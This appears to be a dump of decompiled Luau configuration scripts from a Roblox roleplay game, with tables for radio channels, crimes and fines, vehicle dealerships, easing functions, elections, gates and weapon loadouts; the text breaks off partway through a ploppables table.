replicatedfirst.loadingscreen

game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
local v1 = Instance.new("ScreenGui")
v1.Parent = game.Players.LocalPlayer.PlayerGui
local v2 = script:WaitForChild("LoadingFrame")
v2.Parent = game.Players.LocalPlayer.PlayerGui.ScreenGui
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Health, true)
script:Destroy()

database.assets
-- Decompiled with the Synapse X Luau decompiler.

return {
	LE1 = {
		Name = "LE-1", 
		MaxMessages = 30, 
		Priority = 3
	}, 
	LE2 = {
		Name = "LE-2", 
		MaxMessages = 30, 
		Priority = 4
	}, 
	ES1 = {
		Name = "ES-1", 
		MaxMessages = 30, 
		Priority = 2
	}, 
	Global = {
		Name = "GLOBAL", 
		MaxMessages = 50, 
		Priority = 1
	}, 
	ASPS = {
		Name = "SECURITY-1", 
		MaxMessages = 50, 
		Priority = 1
	},
	AFI = {
		Name = "AFI-1", 
		MaxMessages = 50, 
		Priority = 1
	}, 
	["Fire Department"] = {
		Name = "FIRE-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	PPD = {
		Name = "PLYMOUTH-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	MSP = {
		Name = "STATE-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	NHCSO = {
		Name = "COUNTY-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	LPD = {
		Name = "LANDER-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	MNG = {
		Name = "GUARD-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	PW = {
		Name = "RANGER-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	NHTA = {
		Name = "TRANSIT-1", 
		MaxMessages = 30, 
		Priority = 5
	}
};

database.channels
-- Decompiled with the Synapse X Luau decompiler.

return {
	LE1 = {
		Name = "LE-1", 
		MaxMessages = 30, 
		Priority = 3
	}, 
	LE2 = {
		Name = "LE-2", 
		MaxMessages = 30, 
		Priority = 4
	}, 
	ES1 = {
		Name = "ES-1", 
		MaxMessages = 30, 
		Priority = 2
	}, 
	Global = {
		Name = "GLOBAL", 
		MaxMessages = 50, 
		Priority = 1
	}, 
	ASPS = {
		Name = "SECURITY-1", 
		MaxMessages = 50, 
		Priority = 1
	},
	AFI = {
		Name = "AFI-1", 
		MaxMessages = 50, 
		Priority = 1
	}, 
	["Fire Department"] = {
		Name = "FIRE-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	PPD = {
		Name = "PLYMOUTH-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	MSP = {
		Name = "STATE-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	NHCSO = {
		Name = "COUNTY-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	LPD = {
		Name = "LANDER-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	MNG = {
		Name = "GUARD-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	PW = {
		Name = "RANGER-1", 
		MaxMessages = 30, 
		Priority = 5
	}, 
	NHTA = {
		Name = "TRANSIT-1", 
		MaxMessages = 30, 
		Priority = 5
	}
};

database.constants
-- Decompiled with the Synapse X Luau decompiler.

local v1 = {
	WeaponLicensePrice = 300, 
	Build = 381, 
	GasPrice = 0.125, 
	PaintPrice = 20, 
	RepairPrice = 0.5, 
	DayLength = 36, 
	FogNightAmbient = 30, 
	FogDayAmbient = 190, 
	InventoryCarryWeight = 72, 
	InventoryMaxMisc = 5, 
	JumpPower = 50, 
	HipHeight = 0, 
	MaxHealth = 100, 
	MaxSlopeAngle = 80, 
	WalkSpeed = 12
};
local v2 = nil
if game.PlaceId == 1901858707 then
    v2 = 50;
else
	v2 = 20;
end;
v1.RunSpeed = v2;
v1.WalkFOV = 70;
v1.RunFOV = 80;
v1.GUIEnabled = {
	Minimap = game.PlaceId ~= 993383085
};
v1.VehicleLights = {
	R = {
		Color = Color3.fromRGB(255, 74, 77), 
		Angle = 120, 
		Range = 16, 
		Brightness = 0.5
	}, 
	F = {
		Color = Color3.fromRGB(254, 255, 239), 
		Angle = 120, 
		Range = 36, 
		Brightness = 0.5
	}, 
	IL = {
		Color = Color3.fromRGB(255, 170, 65), 
		Range = 16
	}, 
	IR = {
		Color = Color3.fromRGB(255, 170, 65), 
		Range = 16
	}, 
	RV = {
		Color = Color3.fromRGB(255, 255, 255), 
		Range = 16
	}, 
	BE = {
		Prefix = true, 
		Color = Color3.fromRGB(0, 0, 255), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}, 
	RE = {
		Prefix = true, 
		Color = Color3.fromRGB(255, 0, 0), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}, 
	WE = {
		Prefix = true, 
		Color = Color3.fromRGB(255, 255, 255), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}, 
	OE = {
		Prefix = true, 
		Color = Color3.fromRGB(255, 165, 0), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}, 
	GOE = {
		Prefix = true, 
		Color = Color3.fromRGB(216, 195, 103), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}, 
	TOE = {
		Prefix = true, 
		Color = Color3.fromRGB(216, 195, 103), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}, 
	LED = {
		Prefix = true, 
		Color = Color3.fromRGB(0, 0, 0), 
		Angle = 120, 
		Range = 20, 
		Brightness = 1
	}
};
return v1;
database.crimes
local Crimes = {
	[1] = {
		Name = "Treason",
		Arrest = 15,
		Class = 2
	},
	[2] = {Name = "Bribery", Arrest = 15},
	[3] = {
		Name = "Obstruction of justice",
		Arrest =  12
	},
	[4] = {Name = "Evasion", Arrest = 15},
	[5] = {
		Name = "Felony evasion",
		Arrest = 10,
		Class = 2
	},
	[6] = {
		Name = "Impersonation",
		Arrest = 15,
	},
	[7] = {
		Name = "Second-degree murder",
		Arrest = 15,
		Class = 2
	},
	[8] = {
		Name = "Kidnapping",
		Arrest = 15,
		Class = 2
	},
	[9] = {
		Name = "Involuntary manslaughter",
		Arrest = 10,
		Class = 2
	},
	[10] = {
		Name = "Voluntary manslaughter",
		Arrest =  12,
		Class = 2
	},
	[11] = {
		Name = "False imprisonment",
		Arrest = 15,
		Class = 2
	},
	[12] = {
		Name = "Extortion",
		Arrest = 10,
		Class = 2
	},
	[13] = {
		Name = "Robbery",
		Arrest = 15,
		Class = 2
	},
	[14] = {
		Name = "Assault with a deadly weapon",
		Arrest = 10,
		Class = 2
	},
	[15] = {Name = "Assault", Arrest = 15},
	[16] = {Name = "Battery", Arrest = 17},
	[17] = {
		Name = "Felony hit and run",
		Arrest = 10,
		Class = 2
	},
	[18] = {
		Name = "Hit and run",
		Arrest = 10,
		Fine = 150
	},
	[19] = {
		Name = "Arson",
		Arrest = 10,
		Class = 2
	},
	[20] = {
		Name = "Burglary",
		Arrest = 10,
		Class = 2
	},
	[21] = {
		Name = "Grand theft",
		Arrest = 15,
		Class = 2
	},
	[22] = {
		Name = "Petty theft",
		Arrest = 10,
		Fine = 50
	},
	[23] = {
		Name = "Trespassing",
		Arrest = 0.2,
		Fine = 25
	},
	[24] = {
		Name = "Disturbing the peace",
		Arrest = 5,
		Fine = 100
	},
	[25] = {
		Name = "Reckless driving",
		Arrest = 10,
		Fine = 50
	},
	[26] = {
		Name = "Failure to yield",
		Arrest = 10,
		Fine = 25
	},
	[27] = {Name = "Speeding", Fine = 80},
	[28] = {
		Name = "Running a red light",
		Fine = 50
	},
	[29] = {
		Name = "Running a stop sign",
		Fine = 50
	},
	[30] = {
		Name = "Dangerous lane change",
		Fine = 50
	},
	[31] = {
		Name = "Discharging a firearm in city limits",
		Arrest = 15,
		Fine = 200
	},
	[32] = {
		Name = "Obstructing traffic",
		Arrest = 15,
		Fine = 50
	},
	[33] = {
		Name = "Vandalism",
		Arrest = 5,
		Fine = 25
	},
	[34] = {
		Name = "Failure to pay citation",
		Arrest = 10
	},
	[35] = {
		Name = "Brandishing a firearm in city limits",
		Arrest = 10,
		Fine = 150
	},
	[36] = {
		Name = "Failure to comply",
		Fine = 75
	},
	[37] = {
		Name = "Contempt of court",
		Arrest = 5,
		Fine = 150
	},
	[38] = {
		Name = "Failure to appear",
		Arrest = 5
	},
	[39] = {
		Name = "First-degree murder",
		Arrest = 35
	},
	[40] = {
		Name = "Illegal parking",
		Fine = 50
	},
	[41] = {
		Name = "Driving without headlights at night",
		Fine = 50
	},
	[42] = {
		Name = "Solicitation to commit a crime",
		Arrest = 6
	},
	[43] = {
		Name = "Conspiracy to commit a crime",
		Arrest = 10,
		Class = 2
	},
	[44] = {
		Name = "Attempt to commit a crime",
		Arrest = 14,
		Class = 2
	},
	[45] = {
		Name = "Criminal threats",
		Arrest = 15
	},
	[46] = {
		Name = "Concealing/destroying evidence",
		Arrest = 5,
		Fine = 300
	},
	[47] = {
		Name = "Aiding and abetting",
		Arrest = 10
	},
	[48] = {
		Name = "Open carrying a long gun in city limits",
		Arrest = 10,
		Fine = 125
	},
	[49] = {
		Name = "Unlawful dealing of a firearm",
		Arrest =  12,
		Fine = 350,
		Class = 2
	},
	[50] = {
		Name = "Unlicensed possession of a firearm",
		Arrest = 10,
		Fine = 300
	},
	[51] = {
		Name = "Unauthorised possession of a high-capacity magazine",
		Arrest = 15,
		Fine = 175
	},
	[52] = {
		Name = "Contempt of Senate",
		Arrest = 5,
		Fine = 175
	},
	[53] = {
		Name = "Disorderly conduct",
		Arrest = 10,
		Fine = 150
	},
	[54] = {
		Name = "Off-roading in an incorporated area",
		Arrest = 5,
		Fine = 90
	},
	[55] = {
		Name = "Brandishing a firearm within an area of natural beauty",
		Arrest = 5,
		Fine = 150
	},
	[56] = {
		Name = "Discharging a firearm within an area of natural beauty",
		Arrest = 10,
		Fine = 200
	},
	[57] = {
		Name = "Misconduct", 
		Arrest = 5, 
		Fine = 250, 
		Class = 1	
	},
	[58] = {
		Name = "Gross Misconduct", 
		Arrest = 15, 
		Fine = 500, 
		Class = 2
	},
	[59] = {
		Name = "Felony Misconduct", 
		Arrest = 10, 
		Class = 2
	},
	[60] = {
		Name = "Unlicensed possession of non-civilian equipment", 
		Arrest = 10, 
		Fine = 300, 
		Class = 1
	},
	[61] = {
		Name = "Carrying a firearm in a firearm-free zone", 
		Arrest = 17, 
		Fine = 225, 
		Class = 1
	},
	[62] = {
		Name = "Espionage", 
		Arrest =  20, 
		Class = 2
	},
	[63] = {
		Name = "Simple Espionage", 
		Arrest =  20, 
		Class = 1
	},
}
return Crimes
database.delearship
-- Script GUID: {5BD7ABD4-6A6B-4370-B31C-86FC0D513682}
-- Decompiled with the Synapse X Luau decompiler.

return {
	Plymouth = {
		Name = "Verdelac Vehicles", 
		Accepts = 3, 
		Vehicles = { { "Carpathian", 130 }, { "Crusader", 60 }, { "CrusaderC", 50 }, { "CabCrusaderC", 70 }, { "CabCrusader", 55 }, { "Conveyor", 80 }, { "Chariot", 25 }, { "ChariotIntrepid", 38 }, { "ChariotExplorer", 50 }, { "ChariotUtility", 43 }, { "ElDorado", 75 }, { "StretchCrusader", 90 }, { "Jackal", 70 }, { "TaxiJackal", 80 }, { "ElDorado4x4", 85 }, { "TrailDestroyer", 75 } }
	}, 
	WestPoint = {
		Name = "West Point Vehicles", 
		Accepts = 3, 
		Vehicles = { { "Crusader", 55 }, { "CrusaderC", 45 }, { "Conveyor", 77 }, { "Chariot", 28 }, { "ChariotIntrepid", 36 }, { "ElDorado", 52 }, { "Jackal", 68 }, { "GolfCart", 25 } }
	}, 
	Lander = {
		Name = "Bad Bill's 'Used' Cars", 
		Accepts = 3, 
		Vehicles = { { "CrusaderC", 45 }, { "Crusader", 62 }, { "CabCrusader", 56 }, { "Conveyor", 82 }, { "Chariot", 28 }, { "ChariotIntrepid", 40 }, { "ChariotUtility", 45 }, { "ElDorado", 78 }, { "ElDorado4x4", 88 }, { "TrailDestroyer", 80 } }
	}
};

database.easingstyles

-- Decompiled with the Synapse X Luau decompiler.

local l__math_pow__1 = math.pow;
local function u2(p1, p2, p3, p4)
	p1 = p1 / p4;
	return -p3 * p1 * (p1 - 2) + p2;
end;
local function u3(p5, p6, p7, p8)
	p5 = p5 / p8;
	return p7 * l__math_pow__1(p5, 2) + p6;
end;
local function u4(p9, p10, p11, p12)
	p9 = p9 / p12 - 1;
	return p11 * (l__math_pow__1(p9, 3) + 1) + p10;
end;
local function u5(p13, p14, p15, p16)
	p13 = p13 / p16;
	return p15 * l__math_pow__1(p13, 3) + p14;
end;
local function u6(p17, p18, p19, p20)
	p17 = p17 / p20 - 1;
	return -p19 * (l__math_pow__1(p17, 4) - 1) + p18;
end;
local function u7(p21, p22, p23, p24)
	p21 = p21 / p24;
	return p23 * l__math_pow__1(p21, 4) + p22;
end;
local function u8(p25, p26, p27, p28)
	p25 = p25 / p28 - 1;
	return p27 * (l__math_pow__1(p25, 5) + 1) + p26;
end;
local function u9(p29, p30, p31, p32)
	p29 = p29 / p32;
	return p31 * l__math_pow__1(p29, 5) + p30;
end;
local l__math_pi__10 = math.pi;
local l__math_cos__11 = math.cos;
local l__math_sin__12 = math.sin;
local function u13(p33, p34, p35, p36)
	return p35 * l__math_sin__12(p33 / p36 * (l__math_pi__10 / 2)) + p34;
end;
local function u14(p37, p38, p39, p40)
	return -p39 * l__math_cos__11(p37 / p40 * (l__math_pi__10 / 2)) + p39 + p38;
end;
local function u15(p41, p42, p43, p44)
	if p41 == p44 then
		return p42 + p43;
	end;
	return p43 * 1.001 * (-l__math_pow__1(2, -10 * p41 / p44) + 1) + p42;
end;
local function u16(p45, p46, p47, p48)
	if p45 == 0 then
		return p46;
	end;
	return p47 * l__math_pow__1(2, 10 * (p45 / p48 - 1)) + p46 - p47 * 0.001;
end;
local l__math_sqrt__17 = math.sqrt;
local function u18(p49, p50, p51, p52)
	p49 = p49 / p52 - 1;
	return p51 * l__math_sqrt__17(1 - l__math_pow__1(p49, 2)) + p50;
end;
local function u19(p53, p54, p55, p56)
	p53 = p53 / p56;
	return -p55 * (l__math_sqrt__17(1 - l__math_pow__1(p53, 2)) - 1) + p54;
end;
local l__math_abs__20 = math.abs;
local l__math_asin__21 = math.asin;
local function u22(p57, p58, p59, p60, p61, p62)
	local v1 = nil
	if p57 == 0 then
		return p58;
	end;
	p57 = p57 / p60;
	if p57 == 1 then
		return p58 + p59;
	end;
	if not p62 then
		p62 = p60 * 0.3;
	end;
	if not p61 or p61 < l__math_abs__20(p59) then
		p61 = p59;
		 v1 = p62 / 4;
	else
		v1 = p62 / (2 * l__math_pi__10) * l__math_asin__21(p59 / p61);
	end;
	return p61 * l__math_pow__1(2, -10 * p57) * l__math_sin__12((p57 * p60 - v1) * (2 * l__math_pi__10) / p62) + p59 + p58;
end;
local function u23(p63, p64, p65, p66, p67, p68)
	local v2 = nil
	if p63 == 0 then
		return p64;
	end;
	p63 = p63 / p66;
	if p63 == 1 then
		return p64 + p65;
	end;
	if not p68 then
		p68 = p66 * 0.3;
	end;
	if not p67 or p67 < l__math_abs__20(p65) then
		p67 = p65;
		 v2 = p68 / 4;
	else
		v2 = p68 / (2 * l__math_pi__10) * l__math_asin__21(p65 / p67);
	end;
	p63 = p63 - 1;
	return -(p67 * l__math_pow__1(2, 10 * p63) * l__math_sin__12((p63 * p66 - v2) * (2 * l__math_pi__10) / p68)) + p64;
end;
local function u24(p69, p70, p71, p72, p73)
	if not p73 then
		p73 = 1.70158;
	end;
	p69 = p69 / p72 - 1;
	return p71 * (p69 * p69 * ((p73 + 1) * p69 + p73) + 1) + p70;
end;
local function u25(p74, p75, p76, p77, p78)
	if not p78 then
		p78 = 1.70158;
	end;
	p74 = p74 / p77;
	return p76 * p74 * p74 * ((p78 + 1) * p74 - p78) + p75;
end;
local function u26(p79, p80, p81, p82)
	p79 = p79 / p82;
	if p79 < 0.36363636363636365 then
		return p81 * (7.5625 * p79 * p79) + p80;
	end;
	if p79 < 0.7272727272727273 then
		p79 = p79 - 0.5454545454545454;
		return p81 * (7.5625 * p79 * p79 + 0.75) + p80;
	end;
	if p79 < 0.9090909090909091 then
		p79 = p79 - 0.8181818181818182;
		return p81 * (7.5625 * p79 * p79 + 0.9375) + p80;
	end;
	p79 = p79 - 0.9545454545454546;
	return p81 * (7.5625 * p79 * p79 + 0.984375) + p80;
end;
local function u27(p83, p84, p85, p86)
	return p85 - u26(p86 - p83, 0, p85, p86) + p84;
end;
return {
	linear = function(p87, p88, p89, p90)
		return p89 * p87 / p90 + p88;
	end, 
	inQuad = u3, 
	outQuad = u2, 
	inOutQuad = function(p91, p92, p93, p94)
		p91 = p91 / p94 * 2;
		if p91 < 1 then
			return p93 / 2 * l__math_pow__1(p91, 2) + p92;
		end;
		return -p93 / 2 * ((p91 - 1) * (p91 - 3) - 1) + p92;
	end, 
	outInQuad = function(p95, p96, p97, p98)
		if p95 < p98 / 2 then
			return u2(p95 * 2, p96, p97 / 2, p98);
		end;
		return u3(p95 * 2 - p98, p96 + p97 / 2, p97 / 2, p98);
	end, 
	inCubic = u5, 
	outCubic = u4, 
	inOutCubic = function(p99, p100, p101, p102)
		p99 = p99 / p102 * 2;
		if p99 < 1 then
			return p101 / 2 * p99 * p99 * p99 + p100;
		end;
		p99 = p99 - 2;
		return p101 / 2 * (p99 * p99 * p99 + 2) + p100;
	end, 
	outInCubic = function(p103, p104, p105, p106)
		if p103 < p106 / 2 then
			return u4(p103 * 2, p104, p105 / 2, p106);
		end;
		return u5(p103 * 2 - p106, p104 + p105 / 2, p105 / 2, p106);
	end, 
	inQuart = u7, 
	outQuart = u6, 
	inOutQuart = function(p107, p108, p109, p110)
		p107 = p107 / p110 * 2;
		if p107 < 1 then
			return p109 / 2 * l__math_pow__1(p107, 4) + p108;
		end;
		p107 = p107 - 2;
		return -p109 / 2 * (l__math_pow__1(p107, 4) - 2) + p108;
	end, 
	outInQuart = function(p111, p112, p113, p114)
		if p111 < p114 / 2 then
			return u6(p111 * 2, p112, p113 / 2, p114);
		end;
		return u7(p111 * 2 - p114, p112 + p113 / 2, p113 / 2, p114);
	end, 
	inQuint = u9, 
	outQuint = u8, 
	inOutQuint = function(p115, p116, p117, p118)
		p115 = p115 / p118 * 2;
		if p115 < 1 then
			return p117 / 2 * l__math_pow__1(p115, 5) + p116;
		end;
		p115 = p115 - 2;
		return p117 / 2 * (l__math_pow__1(p115, 5) + 2) + p116;
	end, 
	outInQuint = function(p119, p120, p121, p122)
		if p119 < p122 / 2 then
			return u8(p119 * 2, p120, p121 / 2, p122);
		end;
		return u9(p119 * 2 - p122, p120 + p121 / 2, p121 / 2, p122);
	end, 
	inSine = u14, 
	outSine = u13, 
	inOutSine = function(p123, p124, p125, p126)
		return -p125 / 2 * (l__math_cos__11(l__math_pi__10 * p123 / p126) - 1) + p124;
	end, 
	outInSine = function(p127, p128, p129, p130)
		if p127 < p130 / 2 then
			return u13(p127 * 2, p128, p129 / 2, p130);
		end;
		return u14(p127 * 2 - p130, p128 + p129 / 2, p129 / 2, p130);
	end, 
	inExpo = u16, 
	outExpo = u15, 
	inOutExpo = function(p131, p132, p133, p134)
		if p131 == 0 then
			return p132;
		end;
		if p131 == p134 then
			return p132 + p133;
		end;
		p131 = p131 / p134 * 2;
		if p131 < 1 then
			return p133 / 2 * l__math_pow__1(2, 10 * (p131 - 1)) + p132 - p133 * 0.0005;
		end;
		p131 = p131 - 1;
		return p133 / 2 * 1.0005 * (-l__math_pow__1(2, -10 * p131) + 2) + p132;
	end, 
	outInExpo = function(p135, p136, p137, p138)
		if p135 < p138 / 2 then
			return u15(p135 * 2, p136, p137 / 2, p138);
		end;
		return u16(p135 * 2 - p138, p136 + p137 / 2, p137 / 2, p138);
	end, 
	inCirc = u19, 
	outCirc = u18, 
	inOutCirc = function(p139, p140, p141, p142)
		p139 = p139 / p142 * 2;
		if p139 < 1 then
			return -p141 / 2 * (l__math_sqrt__17(1 - p139 * p139) - 1) + p140;
		end;
		p139 = p139 - 2;
		return p141 / 2 * (l__math_sqrt__17(1 - p139 * p139) + 1) + p140;
	end, 
	outInCirc = function(p143, p144, p145, p146)
		if p143 < p146 / 2 then
			return u18(p143 * 2, p144, p145 / 2, p146);
		end;
		return u19(p143 * 2 - p146, p144 + p145 / 2, p145 / 2, p146);
	end, 
	inElastic = u23, 
	outElastic = u22, 
	inOutElastic = function(p147, p148, p149, p150, p151, p152)
		local v3 = nil
		if p147 == 0 then
			return p148;
		end;
		p147 = p147 / p150 * 2;
		if p147 == 2 then
			return p148 + p149;
		end;
		if not p152 then
			p152 = p150 * 0.44999999999999996;
		end;
		if not p151 then
			p151 = 0;
		end;
		if not p151 or p151 < l__math_abs__20(p149) then
			p151 = p149;
			 v3 = p152 / 4;
		else
			v3 = p152 / (2 * l__math_pi__10) * l__math_asin__21(p149 / p151);
		end;
		if p147 < 1 then
			p147 = p147 - 1;
			return -0.5 * (p151 * l__math_pow__1(2, 10 * p147) * l__math_sin__12((p147 * p150 - v3) * (2 * l__math_pi__10) / p152)) + p148;
		end;
		p147 = p147 - 1;
		return p151 * l__math_pow__1(2, -10 * p147) * l__math_sin__12((p147 * p150 - v3) * (2 * l__math_pi__10) / p152) * 0.5 + p149 + p148;
	end, 
	outInElastic = function(p153, p154, p155, p156, p157, p158)
		if p153 < p156 / 2 then
			return u22(p153 * 2, p154, p155 / 2, p156, p157, p158);
		end;
		return u23(p153 * 2 - p156, p154 + p155 / 2, p155 / 2, p156, p157, p158);
	end, 
	inBack = u25, 
	outBack = u24, 
	inOutBack = function(p159, p160, p161, p162, p163)
		if not p163 then
			p163 = 1.70158;
		end;
		p163 = p163 * 1.525;
		p159 = p159 / p162 * 2;
		if p159 < 1 then
			return p161 / 2 * (p159 * p159 * ((p163 + 1) * p159 - p163)) + p160;
		end;
		p159 = p159 - 2;
		return p161 / 2 * (p159 * p159 * ((p163 + 1) * p159 + p163) + 2) + p160;
	end, 
	outInBack = function(p164, p165, p166, p167, p168)
		if p164 < p167 / 2 then
			return u24(p164 * 2, p165, p166 / 2, p167, p168);
		end;
		return u25(p164 * 2 - p167, p165 + p166 / 2, p166 / 2, p167, p168);
	end, 
	inBounce = u27, 
	outBounce = u26, 
	inOutBounce = function(p169, p170, p171, p172)
		if p169 < p172 / 2 then
			return u27(p169 * 2, 0, p171, p172) * 0.5 + p170;
		end;
		return u26(p169 * 2 - p172, 0, p171, p172) * 0.5 + p171 * 0.5 + p170;
	end, 
	outInBounce = function(p173, p174, p175, p176)
		if p173 < p176 / 2 then
			return u26(p173 * 2, p174, p175 / 2, p176);
		end;
		return u27(p173 * 2 - p176, p174 + p175 / 2, p175 / 2, p176);
	end
};


database.elections
--SynapseX Decompiler

local Elections = {}
local times = {Start = 1, End = 3}
local cTitle = {"Choice"}
local senTitle = {"Senator"}
local daTitle = {
	"District Attorney"
}
local mfColor = Color3.fromRGB(49, 66, 85)
local perms = {"Citizen"}
local options = {
	[1] = {
		{"Yes"},
		cTitle
	},
	[2] = {
		{"No"},
		cTitle
	}
}
Elections.SENATE201907 = {
	Name = "Mayflower State Senate By-election",
	Roles = perms,
	Times = times,
	Places = 1,
	Options = {
		[1] = {
			{
				"AdamStratton"
			},
			senTitle
		},
		[2] = {
			{
				"Fyodor_Karamazov"
			},
			senTitle
		},
		[3] = {
			{
				"PhosilioUnderwood"
			},
			senTitle
		},
		[4] = {
			{
				"policetonyR"
			},
			senTitle
		},
		[5] = {
			{
				"PvPParasite"
			},
			senTitle
		},
		[6] = {
			{
				"SirSamuelSmith"
			},
			senTitle
		},
		[7] = {
			{
				"SuperstarOnMinecraft"
			},
			senTitle
		},
		[8] = {
			{
				"TotalJSyndicate"
			},
			senTitle
		},
		[9] = {
			{"Uh_Cam"},
			senTitle
		},
		[10] = {
			{
				"zombielandrock"
			},
			senTitle
		}
	},
	Type = "AV",
	Display = "1",
	Color = mfColor
}

return Elections

database.gateways
-- Decompiled with the Synapse X Luau decompiler.

return {
	Default = {
		VelocityOpen = 0.06, 
		VelocityClose = 0.1, 
		Angle = 85, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 40, 
		SoundMinDistance = 5, 
		AutoClose = 4
	}, 
	FireBayTall = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 115, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	BusBayDoor = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 100, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	MPBSGarageDoor = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 100, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	FireBayShort = {
		VelocityOpen = 0.01, 
		VelocityClose = 0.01, 
		Angle = 115, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	LanderParkGate = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 100, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 0, 
		SoundMinDistance = 0
	}, 
	NGGate = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 90, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 0, 
		SoundMinDistance = 0
	}, 
	SHParkingGate = {
		VelocityOpen = 0.05, 
		VelocityClose = 0.05, 
		Angle = 90, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 40, 
		SoundMinDistance = 5
	}
};

database.items
-- Decompiled with the Synapse X Luau decompiler.

return {
	Default = {
		VelocityOpen = 0.06, 
		VelocityClose = 0.1, 
		Angle = 85, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 40, 
		SoundMinDistance = 5, 
		AutoClose = 4
	}, 
	FireBayTall = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 115, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	BusBayDoor = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 100, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	MPBSGarageDoor = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 100, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	FireBayShort = {
		VelocityOpen = 0.01, 
		VelocityClose = 0.01, 
		Angle = 115, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 80, 
		SoundMinDistance = 15
	}, 
	LanderParkGate = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 100, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 0, 
		SoundMinDistance = 0
	}, 
	NGGate = {
		VelocityOpen = 0.005, 
		VelocityClose = 0.005, 
		Angle = 90, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 0, 
		SoundMinDistance = 0
	}, 
	SHParkingGate = {
		VelocityOpen = 0.05, 
		VelocityClose = 0.05, 
		Angle = 90, 
		SoundOpen = 205042484, 
		SoundClose = 205042586, 
		SoundMaxDistance = 40, 
		SoundMinDistance = 5
	}
};
database.lc
																																																																																																																			-- Script GUID: {94C48198-3009-4269-9C79-6D5E0EB074D4}
-- Decompiled with the Synapse X Luau decompiler.

return { {
	Asset = "DelinoR21", 
	Name = "Delino R21", 
	Section = "Primary", 
	Mag = "Mag55610", 
	MagQuanity = 12
}, {
	Asset = "DelinoR21AC", 
	Name = "Delino R21A", 
	Section = "Primary", 
	Mag = "Mag556", 
	MagQuanity = 10
}, {}, {
	Asset = "DelinoR21M", 
	Name = "Delino R21M", 
	Section = "Primary", 
	Mag = "Mag556", 
	MagQuanity = 10
}, {
	Asset = "Hawth500C", 
	Name = "Hawthorn 500", 
	Section = "Primary", 
	Mag = "Mag12G", 
	MagQuanity = 10
}, {
	Asset = "None", 
	Name = "None", 
	Section = "Secondary" --Primary
}, {
	Asset = "Benn17C", 
	Name = "Bennetti 17", 
	Section = "Secondary", 
	Mag = "MagB17", 
	MagQuanity = 10
},{
	Asset = "Delino1711", 
	Name = "Delino 1711", 
	Section = "Secondary", 
	Mag = "Mag45", 
	MagQuanity = 12
}, {
	Asset = "DelinoDef", 
	Name = "Delino Defender", 
	Section = "Secondary", 
	Mag = "Mag44", 
	MagQuanity = 9
}, {
	Asset = "DelinoSpec", 
	Name = "Delino Special", 
	Section = "Secondary", 
	Mag = "Mag44", 
	MagQuanity = 9
}, {
	Asset = "None", 
	Name = "None", 
	Section = "Primary"
 
} };

database.ploppables
-- Decompiled with the Synapse X Luau decompiler.

local v1 = {};
local l__Ploppables__2 = game:GetService("ReplicatedStorage").Ploppables;
v1.Cone = {
	Name = "Cone", 
	PlayerLimit = 40, 
	Asset = l__Ploppables__2.Cone, 
	Priority = 1
};
v1.FireBarrier = {
	Name = "Fire Barrier", 
	PlayerLimit = 20, 
	Asset = l__Ploppables__2.FireBarrier, 
